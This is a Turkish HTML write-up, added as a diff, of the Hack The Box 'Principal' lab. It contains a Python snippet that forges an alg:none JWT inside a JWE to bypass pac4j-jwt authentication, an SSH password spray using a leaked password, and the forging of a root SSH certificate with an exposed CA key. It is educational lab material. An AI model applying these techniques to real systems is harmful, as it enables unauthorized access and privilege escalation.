@@ -1,0 +1,550 @@
+<title>Principal — HTB Lab Raporu</title>
+<style>
+  :root{
+    --bg:#F2F3F6;
+    --surface:#FFFFFF;
+    --surface-2:#E8EAF0;
+    --ink:#12151C;
+    --ink-soft:#545B6B;
+    --line:#D7DAE2;
+    --accent:#A87C1E;
+    --accent-ink:#FFFFFF;
+    --term-bg:#0D1117;
+    --term-ink:#C9D1D9;
+    --term-dim:#7D8590;
+    --good:#2E7D4F;
+    --crit:#B54747;
+    --shadow: 0 1px 2px rgba(18,21,28,0.04), 0 8px 24px -12px rgba(18,21,28,0.12);
+  }
+  @media (prefers-color-scheme: dark){
+    :root{
+      --bg:#0B0E14;
+      --surface:#12151D;
+      --surface-2:#171B26;
+      --ink:#E7E9EF;
+      --ink-soft:#9AA3B5;
+      --line:#232838;
+      --accent:#D9B453;
+      --accent-ink:#14151A;
+      --term-bg:#08090D;
+      --term-ink:#C9D1D9;
+      --term-dim:#6B7280;
+      --good:#4CAF7D;
+      --crit:#E07272;
+      --shadow: 0 1px 2px rgba(0,0,0,0.3), 0 12px 32px -16px rgba(0,0,0,0.6);
+    }
+  }
+  :root[data-theme="dark"]{
+    --bg:#0B0E14; --surface:#12151D; --surface-2:#171B26; --ink:#E7E9EF; --ink-soft:#9AA3B5;
+    --line:#232838; --accent:#D9B453; --accent-ink:#14151A; --term-bg:#08090D; --term-ink:#C9D1D9;
+    --term-dim:#6B7280; --good:#4CAF7D; --crit:#E07272;
+    --shadow: 0 1px 2px rgba(0,0,0,0.3), 0 12px 32px -16px rgba(0,0,0,0.6);
+  }
+  :root[data-theme="light"]{
+    --bg:#F2F3F6; --surface:#FFFFFF; --surface-2:#E8EAF0; --ink:#12151C; --ink-soft:#545B6B;
+    --line:#D7DAE2; --accent:#A87C1E; --accent-ink:#FFFFFF; --term-bg:#0D1117; --term-ink:#C9D1D9;
+    --term-dim:#7D8590; --good:#2E7D4F; --crit:#B54747;
+    --shadow: 0 1px 2px rgba(18,21,28,0.04), 0 8px 24px -12px rgba(18,21,28,0.12);
+  }
+
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--ink);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    line-height:1.65;
+    -webkit-font-smoothing:antialiased;
+  }
+  .page{
+    max-width:760px;
+    margin:0 auto;
+    padding:0 24px 96px;
+  }
+  a{color:var(--accent);}
+  a:focus-visible, button:focus-visible{outline:2px solid var(--accent); outline-offset:2px;}
+
+  h1,h2,h3{
+    font-family:"Iowan Old Style","Palatino Linotype",Palatino,Georgia,serif;
+    text-wrap:balance;
+    font-weight:600;
+    color:var(--ink);
+  }
+
+  /* ---- Cover ---- */
+  .cover{
+    padding:64px 0 40px;
+    border-bottom:1px solid var(--line);
+    margin-bottom:40px;
+  }
+  .cover-top{
+    display:flex;
+    align-items:center;
+    gap:20px;
+    margin-bottom:28px;
+  }
+  .p-icon{
+    width:88px; height:88px;
+    border-radius:50%;
+    background:radial-gradient(circle at 32% 28%, #3a2f10, #0e0b04 72%);
+    box-shadow:var(--shadow);
+    flex:none;
+    display:block;
+  }
+  .p-icon .ln{stroke:rgba(217,180,83,0.45); stroke-width:1.6; fill:none;}
+  .p-icon .st{fill:#ffffff;}
+  .p-icon .st.glow{opacity:.3;}
+  .cover-eyebrow{
+    font-family:ui-monospace,SFMono-Regular,Consolas,"Liberation Mono",Menlo,monospace;
+    font-size:.72rem;
+    letter-spacing:.14em;
+    text-transform:uppercase;
+    color:var(--accent);
+    margin:0 0 6px;
+  }
+  .cover h1{
+    font-size:2.6rem;
+    margin:0;
+    line-height:1.05;
+  }
+  .cover p.dek{
+    max-width:56ch;
+    color:var(--ink-soft);
+    font-size:1.05rem;
+    margin:18px 0 0;
+  }
+  .meta-grid{
+    display:grid;
+    grid-template-columns:repeat(4,1fr);
+    gap:1px;
+    background:var(--line);
+    border:1px solid var(--line);
+    border-radius:10px;
+    overflow:hidden;
+    margin-top:32px;
+  }
+  .meta-cell{
+    background:var(--surface);
+    padding:14px 16px;
+  }
+  .meta-cell .k{
+    display:block;
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.66rem;
+    letter-spacing:.08em;
+    text-transform:uppercase;
+    color:var(--ink-soft);
+    margin-bottom:5px;
+  }
+  .meta-cell .v{
+    font-size:.92rem;
+    font-weight:600;
+    font-variant-numeric:tabular-nums;
+  }
+  .v.diff{color:var(--accent);}
+
+  /* ---- chain ---- */
+  .chain{
+    display:flex;
+    flex-wrap:wrap;
+    align-items:center;
+    gap:6px;
+    margin:36px 0 8px;
+  }
+  .chain .step{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.72rem;
+    letter-spacing:.03em;
+    background:var(--surface-2);
+    border:1px solid var(--line);
+    color:var(--ink);
+    padding:6px 11px;
+    border-radius:6px;
+    white-space:nowrap;
+  }
+  .chain .arrow{color:var(--ink-soft); font-size:.85rem;}
+
+  /* ---- sections ---- */
+  section{margin:56px 0;}
+  .section-label{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.72rem;
+    letter-spacing:.14em;
+    text-transform:uppercase;
+    color:var(--accent);
+    margin:0 0 8px;
+  }
+  h2{font-size:1.5rem; margin:0 0 4px;}
+  h3{font-size:1.1rem; margin:28px 0 10px; color:var(--ink);}
+  p{margin:14px 0; max-width:66ch;}
+  ul, ol{margin:14px 0; padding-left:1.3em; max-width:64ch;}
+  li{margin:6px 0;}
+  code.inline{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    background:var(--surface-2);
+    border:1px solid var(--line);
+    padding:.12em .4em;
+    border-radius:4px;
+    font-size:.87em;
+  }
+
+  /* ---- terminal blocks ---- */
+  .term{
+    background:var(--term-bg);
+    border-radius:10px;
+    box-shadow:var(--shadow);
+    overflow:hidden;
+    margin:18px 0;
+  }
+  .term-bar{
+    display:flex;
+    align-items:center;
+    gap:6px;
+    padding:9px 12px;
+    border-bottom:1px solid rgba(255,255,255,0.06);
+  }
+  .term-bar .dot{width:9px; height:9px; border-radius:50%; background:#4b5062;}
+  .term-title{
+    margin-left:8px;
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.7rem;
+    color:var(--term-dim);
+  }
+  .term pre{
+    margin:0;
+    padding:14px 16px 16px;
+    overflow-x:auto;
+    font-family:ui-monospace,SFMono-Regular,Consolas,"Liberation Mono",Menlo,monospace;
+    font-size:.82rem;
+    line-height:1.6;
+    color:var(--term-ink);
+  }
+  .term .p{color:var(--accent);}
+  .term .c{color:#7EC7A2;}
+  .term .o{color:var(--term-dim);}
+  .term .hit{color:#E8B563;}
+  .term .bad{color:var(--crit);}
+  .term .ok{color:var(--good);}
+
+  /* ---- callouts ---- */
+  .callout{
+    border-left:3px solid var(--accent);
+    background:var(--surface);
+    border-radius:0 8px 8px 0;
+    padding:14px 18px;
+    margin:18px 0;
+    box-shadow:var(--shadow);
+  }
+  .callout .lbl{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.68rem;
+    letter-spacing:.1em;
+    text-transform:uppercase;
+    color:var(--accent);
+    display:block;
+    margin-bottom:6px;
+  }
+  .callout.crit{border-left-color:var(--crit);}
+  .callout.crit .lbl{color:var(--crit);}
+  .callout.good{border-left-color:var(--good);}
+  .callout.good .lbl{color:var(--good);}
+
+  .cvss-row{display:flex; align-items:center; gap:10px; flex-wrap:wrap;}
+  .cvss-score{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-weight:700; font-size:1.15rem; font-variant-numeric:tabular-nums;
+  }
+  .cvss-vec{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.76rem; color:var(--ink-soft); word-break:break-all;
+  }
+
+  table.simple{
+    width:100%;
+    border-collapse:collapse;
+    margin:18px 0;
+    font-size:.88rem;
+  }
+  table.simple th, table.simple td{
+    text-align:left;
+    padding:8px 10px;
+    border-bottom:1px solid var(--line);
+    font-variant-numeric:tabular-nums;
+  }
+  table.simple th{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.68rem;
+    letter-spacing:.06em;
+    text-transform:uppercase;
+    color:var(--ink-soft);
+    font-weight:600;
+  }
+  table.simple td.mono{font-family:ui-monospace,SFMono-Regular,Consolas,monospace; font-size:.83rem;}
+
+  .flag{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.85rem;
+    background:var(--surface-2);
+    border:1px solid var(--line);
+    padding:8px 12px;
+    border-radius:7px;
+    margin-right:10px;
+  }
+  .flag .tick{color:var(--good); font-weight:700;}
+
+  footer{
+    margin-top:64px;
+    padding-top:20px;
+    border-top:1px solid var(--line);
+    color:var(--ink-soft);
+    font-size:.82rem;
+  }
+  footer a{color:var(--ink-soft);}
+  footer a:hover{color:var(--accent);}
+
+  @media (max-width:560px){
+    .meta-grid{grid-template-columns:repeat(2,1fr);}
+    .cover h1{font-size:2rem;}
+  }
+
+  @media print{
+    @page{ margin:14mm; }
+    *{
+      -webkit-print-color-adjust:exact !important;
+      print-color-adjust:exact !important;
+      color-adjust:exact !important;
+    }
+    body{background:#fff;}
+    .page{max-width:none;}
+    .term{box-shadow:none; border:1px solid #333;}
+    .callout{box-shadow:none;}
+    .term, .callout, .meta-grid, .flag{break-inside:avoid;}
+    h2, h3, .section-label{break-after:avoid;}
+    .cover{break-inside:avoid;}
+  }
+</style>
+
+<div class="page">
+
+  <div class="cover">
+    <div class="cover-top">
+      <svg class="p-icon" viewBox="0 0 88 88" aria-hidden="true">
+        <g class="ln">
+          <path d="M32 40 V32 a12 12 0 0 1 24 0 V40"/>
+          <rect x="26" y="40" width="36" height="28" rx="4"/>
+        </g>
+        <circle class="st glow" cx="44" cy="54" r="10"/>
+        <circle class="st" cx="44" cy="54" r="3"/>
+        <line class="ln" x1="44" y1="57" x2="44" y2="63"/>
+      </svg>
+      <div>
+        <p class="cover-eyebrow">Hack The Box · Medium · Linux</p>
+        <h1>Principal</h1>
+      </div>
+    </div>
+    <p class="dek">Kriptografik zarfın doğrulanmasıyla içindeki kimlik iddiasının doğrulanmasının aynı şey olmadığı bir makine. <code class="inline">pac4j-jwt</code>'te imzasız bir JWT'yi geçerli bir JWE içine sararak kimlik doğrulamayı atlatan bir zincirle başlıyor, yanlış yapılandırılmış bir SSH sertifika otoritesi üzerinden root'a uzanıyor.</p>
+
+    <div class="meta-grid">
+      <div class="meta-cell"><span class="k">Hedef</span><span class="v">10.129.52.59</span></div>
+      <div class="meta-cell"><span class="k">Zorluk</span><span class="v diff">Medium</span></div>
+      <div class="meta-cell"><span class="k">İşletim Sistemi</span><span class="v">Ubuntu 24.04 LTS</span></div>
+      <div class="meta-cell"><span class="k">Kategori</span><span class="v">Web / JWT-JWE / SSH CA</span></div>
+    </div>
+
+    <div class="chain">
+      <span class="step">Recon</span><span class="arrow">→</span>
+      <span class="step">pac4j-jwt JWE/JWT bypass (CVE-2026-29000)</span><span class="arrow">→</span>
+      <span class="step">admin (web)</span><span class="arrow">→</span>
+      <span class="step">parola sızıntısı</span><span class="arrow">→</span>
+      <span class="step">svc-deploy (SSH)</span><span class="arrow">→</span>
+      <span class="step">SSH CA sertifika forgery</span><span class="arrow">→</span>
+      <span class="step">root</span>
+    </div>
+  </div>
+
+  <section>
+    <p class="section-label">01 — Keşif</p>
+    <h2>Port taraması ve web parmak izi</h2>
+    <p>Standart bir Nmap taramasında iki servis bulundu: SSH ve <code class="inline">8080/tcp</code> üzerinde bir Jetty uygulaması. Yanıt başlıkları, uygulamanın kimlik doğrulamasını <code class="inline">pac4j-jwt</code> kütüphanesiyle yaptığını doğrudan ifşa ediyordu.</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">nmap -sV -sC 10.129.244.220</span></div>
+      <pre><span class="p">$</span> nmap -sV -sC 10.129.244.220
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
+8080/tcp open  http-proxy Jetty
+<span class="o">|_http-title: Principal Internal Platform - Login</span>
+<span class="hit">|_X-Powered-By: pac4j-jwt/6.0.3</span></pre>
+    </div>
+  </section>
+
+  <section>
+    <p class="section-label">02 — Web Uygulaması Analizi</p>
+    <h2>İstemci tarafı kaynak kodunda kimlik doğrulama akışı</h2>
+    <p><code class="inline">/static/js/app.js</code>, kimlik doğrulama akışını yorum satırlarında baştan sona belgelemişti — üretim ortamında olmaması gereken, ama saldırgan için tam ihtiyaç duyulan seviyede bir bilgi sızıntısı.</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">static/js/app.js</span></div>
+      <pre><span class="o"> * Authentication flow:
+ * 1. User submits credentials to /api/auth/login
+ * 2. Server returns encrypted JWT (JWE) token
+ * 3. Token is stored and sent as Bearer token
+ *
+ * Token handling:
+ * - Tokens are JWE-encrypted using</span> <span class="hit">RSA-OAEP-256 + A128GCM</span>
+ * <span class="o">- Public key available at</span> <span class="hit">/api/auth/jwks</span>
+ * <span class="o">- Inner JWT is signed with</span> <span class="hit">RS256</span>
+
+<span class="o"> * JWT claims schema: sub / role (ROLE_ADMIN|ROLE_MANAGER|ROLE_USER) / iss / iat / exp</span></pre>
+    </div>
+
+    <p><code class="inline">/api/auth/jwks</code> uç noktası, sunucunun JWE şifrelemesinde kullandığı 2048-bit RSA açık anahtarını doğrudan yayınlıyordu:</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">curl -s .../api/auth/jwks | jq</span></div>
+      <pre><span class="p">$</span> curl -s http://10.129.244.220:8080/api/auth/jwks | jq
+{
+  "keys": [{
+    "kty": "RSA", "e": "AQAB", "kid": <span class="hit">"enc-key-1"</span>,
+    "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5Np..." <span class="o">(256 bayt, 2048-bit)</span>
+  }]
+}</pre>
+    </div>
+
+    <div class="callout">
+      <span class="lbl">Gözlem</span>
+      JWKS yalnızca <em>şifreleme</em> anahtarını yayınlıyor, imza doğrulama anahtarı ayrı ve gizli tutulmuş. Ama RSA-OAEP açık anahtarla şifreleme yapıldığı için bu anahtarı bilen herkes, sunucunun kabul edeceği formatta geçerli bir JWE zarfı üretebilir. Asıl soru, zarfın içine ne konduğu.
+    </div>
+  </section>
+
+  <section>
+    <p class="section-label">03 — Foothold</p>
+    <h2>CVE-2026-29000 — pac4j-jwt kimlik doğrulama atlatması</h2>
+    <p><code class="inline">pac4j-jwt</code> 6.0.3'ün <code class="inline">JwtAuthenticator</code>'ı hem şifreleme (JWE) hem imza (JWS) doğrulamasıyla yapılandırıldığında: JWE decrypt edilir, içindeki payload'a <code class="inline">toSignedJWT()</code> çağrılır. Payload imzasız bir <code class="inline">PlainJWT</code> (<code class="inline">{"alg":"none"}</code>) ise bu çağrı <code class="inline">null</code> döner — kod <code class="inline">if (signedJWT != null)</code> kontrolü yüzünden imza doğrulaması tamamen atlanır. Zarf gerçek, ama içindeki kimlik iddiası hiç sorgulanmıyor.</p>
+
+    <div class="callout crit">
+      <span class="lbl">CVSS 3.1 — Kendi değerlendirmem</span>
+      <div class="cvss-row">
+        <span class="cvss-score" style="color:var(--crit)">9.8 Critical</span>
+        <span class="cvss-vec">AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span>
+      </div>
+    </div>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">jwt_forge.py</span></div>
+      <pre><span class="o"># alg:none, sub=admin, role=ROLE_ADMIN claim'li imzasız PlainJWT kur,</span>
+<span class="o"># RSA-OAEP-256 + A128GCM ile cty:"JWT" header'ıyla JWE'ye sar</span>
+
+header  = b64url({"alg": "none"})
+payload = b64url({"sub": "admin", "role": "ROLE_ADMIN",
+                   "iss": "principal-platform", "iat": now, "exp": now+3600})
+plain_jwt = f"{header}.{payload}."          <span class="o"># imzasız, 3. segment boş</span>
+
+jwe_token = jwe.JWE(plain_jwt.encode(), recipient=pub_key,
+    protected=json.dumps({"alg": "RSA-OAEP-256", "enc": "A128GCM",
+                           "kid": "enc-key-1", "cty": "JWT"}))</pre>
+    </div>
+
+    <div class="callout">
+      <span class="lbl">Debug günlüğü — asıl tuzak</span>
+      Script birebir doğru olmasına rağmen sunucu ısrarla <code class="inline">401 Invalid or expired token</code> döndürdü. İki farklı JOSE kütüphanesi, farklı header sıraları, makine resetleri — hiçbiri çözmedi. Gerçek sebep kriptografiyle ilgili değildi: <strong>saldırgan makinenin saati sunucudan 3 saat ileriydi.</strong> Ürettiğimiz her <code class="inline">iat</code> sunucu için gelecekte kalıyor, doğrulayıcı da sessizce reddediyordu. Çözüm: <code class="inline">iat</code>/<code class="inline">exp</code>'i kendi saatimiz yerine sunucunun HTTP <code class="inline">Date</code> header'ından hesaplamak.
+    </div>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">sunucu saatiyle senkron forge</span></div>
+      <pre><span class="p">$</span> python3 jwt_forge.py http://10.129.52.59:8080
+[*] Server time from Date header: epoch 1784396623
+[*] Local epoch would have been: 1784407425 <span class="bad">(diff: 10802s)</span>
+[+] Forged JWE token created
+
+[*] Accessing /api/dashboard...
+<span class="ok">[+] Status: 200</span>
+{"user": {"username": "admin", "role": <span class="hit">"ROLE_ADMIN"</span>}, ...}</pre>
+    </div>
+  </section>
+
+  <section>
+    <p class="section-label">04 — Yanal Hareket</p>
+    <h2>Admin panelinden sızan parola ve SSH erişimi</h2>
+    <p>Sahte admin token'ıyla <code class="inline">/api/users</code> ve <code class="inline">/api/settings</code> açıldı. Settings'in Security sekmesinde, dışarıya hiç expose edilmemesi gereken bir <code class="inline">encryptionKey</code> alanı vardı — deploy servisleri için kullanılan bir parolaya çok benziyordu.</p>
+
+    <table class="simple">
+      <thead><tr><th>Kullanıcı</th><th>Rol</th><th>Departman</th><th>Durum</th></tr></thead>
+      <tbody>
+        <tr><td class="mono">admin</td><td>ROLE_ADMIN</td><td>IT Security</td><td>Active</td></tr>
+        <tr><td class="mono">svc-deploy</td><td>deployer</td><td>DevOps</td><td>Active</td></tr>
+        <tr><td class="mono">jthompson</td><td>ROLE_USER</td><td>Engineering</td><td>Active</td></tr>
+        <tr><td class="mono">bwright</td><td>ROLE_MANAGER</td><td>Operations</td><td>Active</td></tr>
+        <tr><td class="mono">kkumar</td><td>ROLE_ADMIN</td><td>IT Security</td><td>Disabled</td></tr>
+      </tbody>
+    </table>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">nxc ssh — password spray</span></div>
+      <pre><span class="p">$</span> nxc ssh 10.129.52.59 -u users.txt -p 'D3pl0y_$$H_Now42!'
+SSH   10.129.52.59  22  [-] admin:D3pl0y_$$H_Now42!
+SSH   10.129.52.59  22  <span class="ok">[+] svc-deploy:D3pl0y_$$H_Now42!  Linux - Shell access!</span>
+
+<span class="p">$</span> ssh svc-deploy@10.129.52.59
+svc-deploy@principal:~$ id
+uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),<span class="hit">1001(deployers)</span>
+svc-deploy@principal:~$ cat user.txt</pre>
+    </div>
+
+    <div class="flag"><span class="tick">✓</span> user.txt ele geçirildi</div>
+  </section>
+
+  <section>
+    <p class="section-label">05 — Yetki Yükseltme</p>
+    <h2>SSH CA sertifika forgery</h2>
+    <p><code class="inline">deployers</code> grubu, <code class="inline">/opt/principal/ssh/</code> altındaki bir SSH CA private key'ini okuyabiliyordu. <code class="inline">sshd</code> yapılandırması bu CA'yı <code class="inline">TrustedUserCAKeys</code> ile güveniyordu — ama <code class="inline">AuthorizedPrincipalsFile</code> tanımlı değildi. Bu, foothold'daki aynı hatanın SSH dünyasındaki karşılığı: sertifika CA tarafından imzalandığı sürece, içindeki principal alanı ne olursa olsun kabul ediliyor.</p>
+
+    <div class="callout">
+      <span class="lbl">CVSS 3.1 — Kendi değerlendirmem</span>
+      <div class="cvss-row">
+        <span class="cvss-score" style="color:var(--accent)">8.8 High</span>
+        <span class="cvss-vec">AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</span>
+      </div>
+    </div>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">sshd_config.d/60-principal.conf</span></div>
+      <pre>PubkeyAuthentication yes
+PermitRootLogin prohibit-password
+<span class="hit">TrustedUserCAKeys /opt/principal/ssh/ca.pub</span>   <span class="bad">← AuthorizedPrincipalsFile yok</span></pre>
+    </div>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">root principal'lı sertifika forge et</span></div>
+      <pre><span class="p">$</span> ssh-keygen -t ed25519 -f /tmp/pwn -N ""
+<span class="p">$</span> ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n <span class="hit">root</span> -V +1h /tmp/pwn.pub
+Signed user key /tmp/pwn-cert.pub: id "pwn-root" serial 0 for root valid from ...
+
+<span class="p">$</span> ssh -i /tmp/pwn root@localhost
+root@principal:~# id
+<span class="ok">uid=0(root) gid=0(root) groups=0(root)</span>
+root@principal:~# cat root.txt</pre>
+    </div>
+
+    <div class="flag"><span class="tick">✓</span> root.txt ele geçirildi — makine tamamlandı</div>
+  </section>
+
+  <section>
+    <p class="section-label">Özet</p>
+    <h2>Öğrenilen teknikler</h2>
+    <ul>
+      <li><code class="inline">pac4j-jwt</code>'te JWE/JWS iç içe kullanıldığında, decrypt edilen payload imzasız (<code class="inline">alg:none</code>) bir <code class="inline">PlainJWT</code> ise imza doğrulamasının nasıl sessizce atlanabildiği (CVE-2026-29000).</li>
+      <li>JWKS üzerinden yalnızca <em>şifreleme</em> anahtarının yayınlanmasının bile, açık-anahtar şifrelemenin doğası gereği geçerli zarf üretimine yetebileceği.</li>
+      <li>Sahte token'ın <code class="inline">iat</code>/<code class="inline">exp</code> claim'lerini kendi saatimiz yerine sunucunun HTTP <code class="inline">Date</code> header'ından türetmenin önemi — saat kayması, kriptografiden çok daha sık başarısızlık sebebi.</li>
+      <li>OpenSSH'te <code class="inline">TrustedUserCAKeys</code> tanımlanıp <code class="inline">AuthorizedPrincipalsFile</code>/<code class="inline">-Command</code> unutulduğunda, CA imzası geçerli olan her sertifikanın <em>istenen herhangi bir principal</em> için kabul edildiği.</li>
+    </ul>
+  </section>
+
+  <footer>
+    Kişisel HTB lab notu — Principal (10.129.52.59) — Hack The Box, eğitim/lab ortamı. Flag değerleri platform politikası gereği bu belgede paylaşılmamıştır.
+  </footer>
+
+</div>
